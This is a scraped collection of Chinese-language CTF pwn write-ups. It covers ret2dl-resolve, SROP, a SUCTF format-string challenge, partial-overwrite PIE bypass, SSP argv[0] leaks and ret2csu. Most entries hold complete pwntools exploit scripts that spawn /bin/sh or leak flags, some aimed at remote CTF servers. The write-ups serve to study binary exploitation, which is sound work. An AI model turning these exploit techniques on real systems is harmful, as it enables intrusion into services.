elf.plt[&apos;write&apos;]write_got = elf.got[&apos;write&apos;]fake_sym_addr = base_stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 r_info = index_dynsym &lt;&lt; 8 | 0x7fake_reloc = p32(write_got) + p32(r_info) st_name = fake_sym_addr + 0x10 - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)index_offset = (base_stage + 28) - rel_plt#stage 1 bss_addrpayload = &quot;a&quot;*112 payload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stagep.sendline(payload)#stage 2 system(&apos;/bin/sh&apos;)payload2 = &apos;AAAA&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(base_stage + 80)payload2 += &apos;AAAA&apos;payload2 += &apos;AAAA&apos;payload2 += fake_reloc # stack_addr+28payload2 += &apos;A&apos; * alignpayload2 += fake_sym # stack_addr+36+alignpayload2 += &quot;system\x00&quot;payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += &quot;/bin/sh\x00&quot;payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive()]]></content>
  </entry>
  <entry>
    <title><![CDATA[srop]]></title>
    <url>%2F2019%2F09%2F02%2Fsrop%2F</url>
    <content type="text"><![CDATA[SropSrop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15） 偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0） 这里懂了，大概的原理就懂了一点了（其实我很懵）然后看到了我们的smallest 整个程序只有start函数，没办法调用write和puts这些来leak stack_addr，这就要用到我们的srop了。 首先看懂我们的程序到底在干啥，貌似是在执行read函数，但是我们在gdb里跑一遍是可以发现我们下一步是没有操作了的。然后我们知道read和write函数只是第一个参数不一样，那我们就改一下rax的值，看到有xor 操作就知道它置零了rax，我们要做的就是绕过那一步 那我们先让程序到start最开始的地方，即0x4000b0的地方，然后直接更改低位地址为b3，绕过置零的步骤，就成功调用write了，在leak之后我们还要返回这个程序，所以要再填入一个0x4000b0所以第一步我们发送三个起始地址实现leak 1payload = p64(start_addr) * 3 在实现leak之后就要想办法把execve（‘/bin/sh’,0,0）写入栈里，最后再实现调用 然后我们知道rax这个寄存器非常特殊，它除了被用来指定系统调用的调用号之外，也是函数返回值最后存放的地方。因此，我们可以利用控制函数返回值来控制rax寄存器的值。（其实我不知道的，所以看大佬wp的时候还一脸懵，不知道为啥非要填15个字符，想着又不是格式化字符串，看来还是我太菜了）然后我们将rax寄存器设置成15（sigreturn的系统调用号），然后调用一个syscall，这个效果就和调用一个sigreturn是一样一样的（所以在额外我们再次写入了syscall） 所以第二步是利用sigreturn构造read的frame，第三步是往栈里写入execve（‘/bin/sh’,0,0） 1234567891011121314151617181920212223242526272829sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)#把frame写入栈中sh.send(payload)## set rax=15 and call sigreturnsigreturn = p64(syscall_ret) + &apos;b&apos; * 7sh.send(sigreturn)## call execv(&quot;/bin/sh&quot;,0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x150 # &quot;/bin/sh&quot; &apos;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe) print len(frame_payload)payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;sh.send(payload)sh.send(sigreturn) 完整的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *from LibcSearcher import *small = ELF(&apos;./smallest&apos;)if args[&apos;REMOTE&apos;]: sh = remote(&apos;127.0.0.1&apos;, 7777)else: sh = process(&apos;./smallest&apos;)context.arch = &apos;amd64&apos;context.log_level = &apos;debug&apos;syscall_ret = 0x00000000004000BEstart_addr = 0x00000000004000B0## set start addr three times# gdb.attach(sh)payload = p64(start_addr) * 3sh.send(payload)gdb.attach(sh)## modify the return addr to start_addr+3## so that skip the xor rax,rax; then the rax=1## get stack addrsh.send(&apos;\xb3&apos;)stack_addr = u64(sh.recv()[8:16])log.success(&apos;leak stack addr :&apos; + hex(stack_addr))## make the rsp point to stack_addr## the frame is read(0,stack_addr,0x400)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)sh.send(payload)## set rax=15 and call sigreturnsigreturn = p64(syscall_ret) + &apos;b&apos; * 7sh.send(sigreturn)## call execv(&quot;/bin/sh&quot;,0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x150 # &quot;/bin/sh&quot; &apos;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)print len(frame_payload)payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;sh.send(payload)sh.send(sigreturn)sh.interactive() 放一张23R3F大佬的理解过程图，写得很明了了（不过关于p64(0)的地方为什么会变成syscall那长度为0xf的东西，我真的没理解到，感觉那个东西只是作为返回值，然后长度传给了rax，然后我一直以为p64（0）只是为了让frame如从上上图的结构，看来还得继续学习理解啊） 感觉srop就粗略的通过这题过了一下子，很多关于机制和寄存器的原理还是有点懵，底层知识还不扎实，要好好补补了 相关参考链接:https://www.freebuf.com/articles/network/87447.html srop的原理https://www.jianshu.com/p/b838a10b63c7 23R3F师傅的wp]]></content>
  </entry>
  <entry>
    <title><![CDATA[suctf的两三题wp]]></title>
    <url>%2F2019%2F08%2F20%2Fplayfmt%2F</url>
    <content type="text"><![CDATA[这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了 以下附上超级简单题的一些思路，当做给自己的记录吧 MT - crpyto这是个密码题，但是我re基础有点太弱了，纯靠逆估计得逆很久，那就选择爆破吧 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;unsigned int convert(unsigned int m) &#123; m = m ^ m &gt;&gt; 13; m = m ^ m &lt;&lt; 9 &amp; 2029229568ll; m = m ^ m &lt;&lt; 17 &amp; 2245263360ll; m = m ^ m &gt;&gt; 19; return m;&#125;int main() &#123; unsigned int i; for (i = 0; i &lt;= (unsigned int)0xffffffffll; i++) &#123; if (i &amp; 0xfffff == 0) printf(&quot;%u\n&quot;, i); if (convert(i) == (unsigned int)1679057065ll) &#123; printf(&quot;%u&quot;, i); break; &#125; &#125; return 0;&#125;//1679057065 2226413449//3818208026 2938293886//2854351778 1730632668 我们发现这道题就是把给的最终结果的flag切片，四个四个以字符的形式（两个十六进制数为一个）一循环，往函数里进行异或和位移操作 写python脚本的时候，崩溃了，跑不出来（能读的位太小？还是我python不熟啊？）换个c发现巨方便 falg : 84B45F89AF22CE7E67275BDC大写发现过不去，改成小写就可以了flag{84b45f89af22ce7e67275bdc} signup - re天知道第一道逆向竟然是rsa（看见熟悉的65537就知道了）把n丢到网站上分出两个质数然后直接丢给解rsa的脚本跑一下就出flag了（脚本来自超级可爱的队友，这里就不po出来了） flag是suctf{Pwn_@_hundred_years} Playfmt - pwn这道题，格式化字符串 看到这里觉得有些眼熟，这不是lab9的那个差不多吗，关键函数，漏洞位置都一样，然后我天真的以为可以套着lab9的方法做这道题，结果…我确实天真，写完脚本，疯狂get不到shell，发现地址没爆错啊，啥都没问题，那肯定是got表改不了的问题了，这个具体看程序函数，貌似是那个this指针？（this+1是指向flag的） 看程序就知道，flag是被读进了堆里，堆的地址，我不会分析，就直接爆破吧 偏移为6的位置作为第一个ebp，指向下一个地址，而下一个又指向了再下一个地址。偏移分别为6 、14 、26，蓝色字体的地址为heap的地址，选择爆破的话，泄露那个应该都OK我们知道flag是被写进堆里的，我们就把heap的地址存入ebp指向的地址处，同时会被存进26个偏移的位置（方便读取数据） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./playfmt&apos;)# p = remote(&apos;120.78.192.35&apos;,9999)elf = ELF(&apos;./playfmt&apos;)libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)printf_got = elf.got[&apos;printf&apos;]system_libc = libc.symbols[&apos;system&apos;] printf_libc = libc.symbols[&apos;printf&apos;] def read_addr(target_addr): index1 = 6 #偏移是6的地方作为第一个ebp index2 = 14 #偏移是14的地方作为ebp2 --&gt; ebp里存的是ebp2的地址 value_ls = map(ord, p32(target_addr)) low_byte = stack_addr &amp; 0xfffor i in range(4): #stack地址就为ebp2处的地址，不变，heap的地址存在ebp2里，ebp2会指向ebp3，所以地址同时写入ebp3中#我对这个的理解是：第一处的payload代表每个ebp里的字节存入单字节heap的地址 payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(low_byte + i, index1) p.sendline(payload) p.recvline() payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(value_ls[i], index2) p.sendline(payload) p.recvline() success(&apos;target &apos; + hex(target_addr)) payload = &apos;%26$p\n\x00&apos; #ebp2指向的地址处，只存放target_addr，可直接读取 p.sendline(payload) p.recvline() payload = &apos;%26$s\n\x00&apos; p.sendline(payload)p.recv()payload = &apos;.%14$p.%18$p.\x00&apos; #%19$p也可p.sendline(payload)p.recvuntil(&quot;.&quot;)stack_addr = int(p.recv(10),16)success(&apos;stack &apos; + hex(stack_addr))p.recvuntil(&quot;.&quot;)heap_addr = int(p.recv(9),16)success(&apos;stack &apos; + hex(stack_addr))success(&apos;heap &apos; + hex(heap_addr))for i in range(-0x1000, 0, 0x4): #这里就随意循环heap的地址，找到flag字符，然后打印出来即可 success(&apos;offset &apos; + hex(i)) read_addr(heap_addr + i) ret = p.recvline() if &apos;suctf&apos; in ret: print(ret) p.interactive()p.interactive() 然后找大佬问了一下怎么确定flag到底写在了哪里，发现是我自己c和数据结构没学好……果然逆向基础和代码基础还是很重要的（一句话，我太菜了） V5是new出来的一个堆，这里的传参为this指针，v8是flag读入的堆，这里是a2（*this+1） Ida里找各个值的地址啥的New出来的v3为this，地址为[heap]0x08810E30其实看这个就能知道flag写在了末尾一个半字节为a10的地方，没关系，我们接着调。 我们输入%1$p发现它跳到了一个地方 发现其实它还没输出东西，那我们就继续往下执行，到printf执行之后，打印出第一个偏移处的地址 然后ida里，可以看见就在printf下面，那我们就算this的位置偏移是多少（数出来是19）我们修改一下ebp的地址，使他指向堆的地址（上面有说到第26个偏移的地方指向堆的地址，我们就把它改到ebp），然后我们把ebp2里指向的堆地址改成this+1的地址 我们tel一下查看堆里的信息，发现其实this+1里存的是flag的地址（上面的flag是自己本机的）然后我们就可以通过%19$s输出真实地址再把它写入ebp2，然后再执行%19$s就可以了Po个exp（来自一位特别特别好的大佬） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;p = remote(&apos;120.78.192.35&apos;,9999)elf = ELF(&apos;./playfmt&apos;)p.recv()payload = &apos;%6$p&apos;p.sendline(payload)sleep(1)################## ebp&amp;retlog_ebp = int(p.recv(),16)#logo ebp 14$ 0xffffd048do_fmt_ebp = log_ebp - 0x20#do fmt ebp 6$ 0xffffd028do_fmt_return = log_ebp -0x1c#do_fmt return_to 7$log.info(&quot;log_ebp--&gt;p[%s]&quot;%hex(log_ebp))log.info(&quot;do_fmt_ebp1--&gt;p[%s]&quot;%hex(do_fmt_ebp))log.info(&quot;do_fmt_return--&gt;p[%s]&quot;%hex(do_fmt_return))#################3 this_addr,flag_addr_offpayload = &apos;%19$p&apos;p.sendline(payload)sleep(1)heap_addr=int(p.recv(),16)#0x8050e30flag_addr_off=heap_addr+4 #0x8050e34log.info(&apos;heap_addr--&gt;p[%s]&apos;%hex(heap_addr))log.info(&apos;flag_addr_off--&gt;p[%s]&apos;%hex(flag_addr_off))################# change this to *flag on stackheap_addr_part=heap_addr &amp; 0xFF#0e30log_ebp_part=log_ebp &amp; 0xFF#d048heap_addr_stack_part=(log_ebp+0x14)&amp;0xFF#D05clog.info(&apos;heap_addr_part--&gt;p[%s]&apos;%hex(heap_addr_part))log.info(&apos;log_ebp_part--&gt;p[%s]&apos;%hex(log_ebp_part))log.info(&apos;heap_addr_stack_part--&gt;p[%s]&apos;%hex(heap_addr_stack_part))payload=&apos;%&apos;+str(heap_addr_stack_part)+&apos;d%6$hhn&apos;p.sendline(payload)p.recv()payload=&apos;%&apos;+str(heap_addr_part+4)+&apos;d%14$hhn&apos;p.sendline(payload)p.recv()#gdb.attach(p)################# leak flag_addrpayload=&apos;%19$s\x00&apos;p.sendline(payload)flag_addr=u32(p.recv(4))#################payload=&apos;%&apos;+str(flag_addr&amp;0xFFFF)+&apos;d%14$hn&apos;p.sendline(payload)p.recvuntil(&apos;134515884&apos;) #%1$p的地址 0x8048CACp.sendline(&apos;%19$s\x00&apos;)p.interactive()` 我们前面不是可以知道那个flag到底是读在了a10的地方吗？那我们就直接改一个，把一个指向栈地址的改成指向堆地址的地址，就是偏移为6的那个地方啦，然后直接修改堆的低地址（18偏移的地方地址为a28,离flag的地方特别近，直接改低一个字节的地址就可以了，贼方便了） 1234567891011121314151617181920#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;# p = remote(&apos;120.78.192.35&apos;,9999)p = process(&apos;./playfmt&apos;)elf = ELF(&apos;./playfmt&apos;)p.recvuntil(&quot;=\n&quot;)p.sendlineafter(&quot;=\n&quot;,&quot;%6$p&quot;)s = p.recvuntil(&quot;\n&quot;)stack_addr = int(s.strip(),16)print hex(stack_addr)stack = stack_addr + 0x10p.sendline(&quot;%&quot; + str(stack&amp;0xff) + &quot;c%6$hhn&quot;)p.sendline(&quot;%16c%14$hhn&quot;)p.sendline(&quot;%18$s&quot;)p.interactive() 这道题真实的flag好像是suctf{P_rin_Tfo}]]></content>
  </entry>
  <entry>
    <title><![CDATA[partial overwrite]]></title>
    <url>%2F2019%2F08%2F16%2Foverwrite%2F</url>
    <content type="text"><![CDATA[partial overwrite我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。（对于绕过PIE的操作我是没怎么接触过的）大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去 Babypie这是一道保护全开的题 看到主程序，发现有两处写入 Read函数的最大问题大概就是它不会给末尾加’\0’所以可以leak地址leak canary在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 （因为canary的低位是\x00截断符，先用\x01去覆盖这个低位，然后打印出来后面的7位，最后加上\x00即可）、 发现有个可以直接getshell的函数，直接可以调用我们用第一个输入点把canary爆出来，然后第二个调用可以直接getshell的函数 然后exp的话，因为开了PIE所以只能知道低三位的地址，第四位得靠爆（真的是随缘的那种） 123456789101112131415161718192021#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *while True: try: p = process(&apos;./babypie&apos;) p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1)) p.recvuntil(&quot;a&quot;*(0x30-0x8+1)) canary = &apos;\0&apos; + p.recvn(7) print &quot;canary:&quot; + hex(u64(canary)) p.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;) p.interactive() except EOFError: p.close() continue 爆破了n遍之后终于。。。 然后发现，直接覆盖低两位地址就好了嘛！（read和system的函数贼接近，前面都是一样的，真的是要哭了） 12345678910111213#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./babypie&apos;)p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))p.recvuntil(&quot;a&quot;*(0x30-0x8+1))canary = &apos;\0&apos; + p.recvn(7)print &quot;canary:&quot; + hex(u64(canary))payload = &apos;&apos;payload += &apos;a&apos;* 0x28 + canary + &apos;aaaaaaaa&apos; + &apos;\x3E&apos;p.send(payload)p.interactive() 效果长这样 gets这题没开pie，但它选择覆盖那里我还是挺懵的，就是两个真实地址，libc_start_main+192 和 _dl_init+139我们到底选择覆盖哪个呢？这就很茫然了Wiki上说的是：我们一般要覆盖字节的话，至少要覆盖 1 个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 gets读取的，也就意味着字符串的末尾肯定会存在\x00。而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看libc_start_main+240 的地址 0x7ffff7a2d830（我这里是800），如果覆盖 3 个字节，那么就是 0x7ffff700xxxx，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 __libc_start_main+240 ，显然是不可能的。而 ld 的基地址呢？如果我们覆盖了栈上_dl_init+139，即为0x7ffff700xxxx。而观察上述的内存布局，我们可以发现libc位于 ld 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为\x00 的。举个例子，目前两者之间的偏移为0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000那么如果 ld 被加载到了 0x7ffff73ca000，则显然 libc 的起始地址就是0x7ffff7000000。然后就理所当然选_dl_init了（我觉得可能是libc是程序开始的地方，离我们要覆盖到的地址有点远，所以选一个近一点的） 所以由上面调试的截图可以看出，我们输完0x18个字符下一个ret处就是libc的地址了，而init离它还有18个偏移(a8-18=90—&gt;8个字节为一个偏移） 然后我们找一个能用的onegadget我们写个payload看看可不可以跑（估计要跑个六七万次，太难了啊） 1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *common_gadget = 0x40059Bdef exp(): for i in range(0x100000): # if args[&apos;REMOTE&apos;]: # p = remote(ip, port) # else: # p = process(&apos;./gets&apos;) # # gdb.attach(p) p = process(&apos;./gets&apos;) try: payload = 0x18 * &apos;a&apos; + p64(common_gadget) for _ in range(2): payload += &apos;a&apos; * 0x28 + p64(common_gadget) payload += &apos;a&apos; * 0x28 + &apos;\x16\02&apos; p.sendline(payload) p.sendline(&apos;ls&apos;) data = p.recv() print data p.interactive() p.close() except Exception: p.close() continueif __name__ == &quot;__main__&quot;:exp() 之前偶然跑出来一次，然后再没跑出来了……先放个exp，改天再试试]]></content>
  </entry>
  <entry>
    <title><![CDATA[ssp操作]]></title>
    <url>%2F2019%2F08%2F16%2Fssp%2F</url>
    <content type="text"><![CDATA[用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串就是通过栈溢出报错信息，泄漏出指定地址的方法： stack smashing detected:+argv[0]如果我们覆盖argv[0]，便会输出特定字符串 满足条件为1、开了canary2、Flag在程序内 看wiki里的花式栈溢出的时候看到的题（其实我很迷为啥把它放到花式栈溢出里，之后再细细研究吧） 关于stack smash 这个有点开拓我知识面了，对于canary我一直很迷，看到这里才知道canary操作起来是个啥样子的。Wiki原话： 在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行?__stack_chk_fail?函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。代码如下 123456void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125; 所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在?__fortify_fail?函数中就会输出我们想要的信息 smashes所以我们要找argv[0]的地址，（因为我们要求的偏移就是argv[0] 距离读取的字符串的偏移） 程序名指向的地址为e159，但是dd98里存放的是指向程序名的地址，所以我们需要的地址为后者接着在输入的地方下个断点，找上一个rsp作为字符串开始的地址 然后我们就可以算偏移了 所以我们的偏移为0x218 看程序会发现在一个地方会有flag的输出 但是我们看不到flag是什么最无奈的是我们输入的内容会覆盖整个地址，所以我们没有办法直接读出我们只能去找另一处的flag地址，这就接触到里另一个新的知识点了： 1在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找（pwndbg的话就用search吧） 现在就可以写exp了 12345678910111213141516#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *# p = process(&apos;./smashes&apos;)p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)flag = 0x0400D20payload = &quot;a&quot;*0x218 + p64(flag)p.recvuntil(&apos;name? &apos;)p.sendline(payload)p.recvuntil(&apos;flag: &apos;)p.sendline(&apos;CTF&apos;)p.interactive() 这里很坑的就是我找flag是按照程序里给的格式找的，是CTF开头的，但是真正的flag是PCTF（0x600d20那个位置的0x50转字符就是P），所以它的地址得再往前拨一位 GUESS再来做道GUESS这题有三次的输入，我们可以通过三次输入实现我们的leak和读取flag，这题和上面那题的思路大概是一致的，都是读取栈上的字符串，而不需要getshell（上面那题是可以知道flag具体存在哪里了，这题需要libc找） 本题思路： 1.泄漏libc的基址2.泄漏environ的地址（也就是栈的地址）3.泄漏flag 三次泄漏都用到了上一题说的ssp，就是通过栈溢出报错信息，泄漏出指定地址的方法：stack smashing detected:+argv[0]如果我们覆盖argv[0]，便会输出特定字符串 对environ很迷的我看了一下23R3F大佬的wp，又发现了新的玩意儿(以下来自大佬博客https://www.jianshu.com/p/cc9d09a3f65f)： 12345在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments?section）用来存储系统环境变量的一份复制文件，进程在运行时可能需要。例如，运行中的进程，可以通过环境变量来访问路径、shell?名称、主机名等信息。该节是可写的，因此在格式串（format?string）和缓冲区溢出（buffer?overflow）攻击中都可以攻击该节。*environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。 好，我们按照刚刚那题的解题步骤，先找argv[0]和字符串开始的地方来计算偏移 算出偏移我们就可以按照思路来写exp了前面两个part如下： 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = process(&apos;./GUESS&apos;)elf = ELF(&apos;./GUESS&apos;)libc = ELF(&apos;./libc.so.6&apos;)puts_got = elf.got[&apos;puts&apos;]# open_flag = 0x400A9A# argv = 0x7fffffffdda8# rsi_addr = 0x7fffffffdc80# distance = 0x128payload = &quot;a&quot;*0x128 + p64(puts_got)p.sendline(payload) p.recvuntil(&apos;stack smashing detected ***: &apos;) puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) # puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) print &quot;puts_addr:&quot;+hex(puts_addr)libc_base = puts_addr - libc.symbols[&apos;puts&apos;] environ_addr = libc_base + libc.symbols[&apos;_environ&apos;] print &quot;libc_base:&quot;+hex(libc_base) print &quot;environ:&quot;+hex(environ_addr)payload = &apos;a&apos;*0x128 + p64(environ_addr) p.sendline(payload) p.recvuntil(&apos;stack smashing detected ***: &apos;) stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) # stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) print &quot;stack_addr:&quot;+hex(stack_addr) 然后我们要算出buf与environ的差值，使程序跳转到flag的位置 构造最后一步的payload 12payload = &apos;a&apos;*0x128 + p64(stack_addr-0x168)p.sendline(payload) 最后效果 其实还是挺迷的，以后碰到题可能还会懵，先记录着吧]]></content>
  </entry>
  <entry>
    <title><![CDATA[libc_csu]]></title>
    <url>%2F2019%2F07%2F08%2Flibc-csu%2F</url>
    <content type="text"><![CDATA[_libc_csu1、Ret2csu 这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。Emmm真是一个异常简洁的main函数 我们发现它有个pwnme函数哦，那就点进去看一下 它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。 然后我们会看到还有一个ret2win函数 看到system就知道我们的getshell的关键步骤就在这里了，最后就是要把地址指向ret2win这个函数的，所以下一步就是要去找gadget。 我们知道ret2win的第三个参数是与rdx有关的，但是我们找不到关于rdx的gadget，所以只能另辟他径。ret2csu这类题目貌似就是通过__libc_csu_init函数的操作（很多gadget的函数） 由函数体关系得知rbx=0rbp=1（rbp=rbx+1）r12：存调用函数的地址r13：函数的第一个参数r14：函数的第二个参数r15：函数的第三个参数（a3/rdx） 然后还有一个很严重的问题，有一个setvbuf函数，据大佬所说是会把rdx的值赋值为0xfffffff，然后无法调用ret2win，所以导致在call处程序出错，无法再执行下去（但是我是在是调不到setvbuf那个函数的地方，下断点也没找到那个赋值语句）然后只能选用一个程序的初始化用的函数地址， 就这两个函数的地址，用这两个函数写入r12里，躲过setvbuf，然后就可以getshell了。 rdx是由r15传值得到的，而刚好下面的一系列操作包括r15的，所以这些gadget可用，上面的函数有个跳转指令，为了使他不跳转，我们可以直接对rbx和rbp赋值，rbx为0，rbp为1。我们先pop这些寄存器，并且赋值，再进入mov，最后在call的地方调用ret2win，所以r12存的应该是ret2win的地址。理清得差不多了，就开始写exp了 12345678910111213141516171819202122232425from pwn import *sh = process('./ret2csu')#bss = 0x0601060start = 0x0400880#mov rdx, r15;mov rsi, r14;mov edi, r13d;call qword ptr [r12+rbx*8]end = 0x0400896#add rsp, 8;pop rbx;pop rbp;pop r12/r13/r14/r15init = 0x0600E10win = 0x04007B1payload = "a"*0x20+p64(0)payload += p64(end)payload += p64(0)payload += p64(0)#rbxpayload += p64(1)#rbppayload += p64(init)#r12payload += p64(0)#r13payload += p64(0)#r14payload += p64(0xdeadcafebabebeef)#r15(rdx)payload += p64(start)payload += "a"*56payload += p64(win)sh.sendline(payload)sh.interactive() 运行之后就拿到flag了 level5Ida里打开main函数 发现这个程序调用了write和read两个函数。没有system没有“/bin/sh”看到了熟悉的gadget 再看看在write和read里面，参数分别是存入哪些寄存器 Write Read 易知第三个参数存入edx（rdx），第二个是esi（rsi），第三个是edi（rdi）在上面的万用gadget里我们知道rdx的值来自于r13，rsi来自于r14，edi来自于r15d 我们要做的是（1）、先调用write函数把read/write函数的真实地址泄露出来（运行程序的时候这两个函数被调用了）找到system或者execve的真实地址（2）、用read函数，把system（“/bin/sh”）写进bss段里(system在bss里，即bss_addr，”/bin/sh”在bss的下一个地址,即bss_addr+8（3）、调用system函数达成getshell 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *from LibcSearcher import *p = process("./level5")elf = ELF('./level5')write_got = elf.got['write']read_got = elf.got['read']#bss_base = elf.bss()bss_addr = 0x0601040start_addr = 0x0400600 #add rsp, 8 pop rbx,rbp,r12,r13,r14,r15end_addr = 0x040061A #mov rdx,13 rsi,r14 eid,r15 call_start = elf.symbols['_start']def csu(rbx,rbp,r12,r13,r14,r15,_start): payload = "a"*0x80 +p64(0) payload += p64(end_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15) payload += p64(start_addr)+"a"*0x38 payload += p64(_start) p.send(payload) sleep(1)p.recvuntil('Hello, World\n')csu(0,1,write_got,8,write_got,1,_start)write_addr = u64(p.recv(8))libc = LibcSearcher('write',write_addr)offest = write_addr-libc.dump('write')system_addr = libc.dump('system')+offestp.recvuntil("Hello, World\n")csu(0,1,read_got,16,bss_addr,0,_start)p.send(p64(system_addr)+"/bin/sh\x00")p.recvuntil("Hello, World\n")csu(0,1,bss_addr,0,0,bss_addr+8,_start)p.interactive() 运行结果 OJ level5题目说假设system和execve被禁用，用mmap和mprotect实现getshell。所以我们需要自己将shellcode写进bss段里。 科普一下mmap和mprotect 我们通过函数mmap来告诉操作系统把哪个文件映射哪块内存去，并且设置我们可能对这块内存的不能操作，就是对文件一样。 1234#include&lt;sys/mman.h&gt;void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off)返回值：成功返回被映射的内存地址，失败返回MAP_FIALED 参数 